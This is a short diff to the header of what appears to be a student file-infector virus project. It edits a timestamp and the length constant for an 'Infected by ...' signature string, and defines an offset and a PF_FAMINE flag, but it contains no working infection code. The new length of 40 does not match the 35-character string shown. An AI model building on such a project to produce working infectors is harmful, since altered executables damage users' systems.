@@ -6,7 +6,7 @@
 /*   By: nguiard <nguiard@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2024/09/09 03:01:42 by nguiard           #+#    #+#             */
-/*   Updated: 2024/11/25 15:17:44 by nguiard          ###   ########.fr       */
+/*   Updated: 2024/11/25 15:42:47 by nguiard          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -26,7 +26,7 @@ typedef	unsigned char		byte;
 typedef	unsigned __int128	uint128_t;
 
 #define SIGNATURE			"Infected by adben-mc and nguiard ;)"
-#define SIGNATURE_LEN		36
+#define SIGNATURE_LEN		40
 #define SIGNATURE_OFFSET	32
 
 #define	PF_FAMINE			0b10000
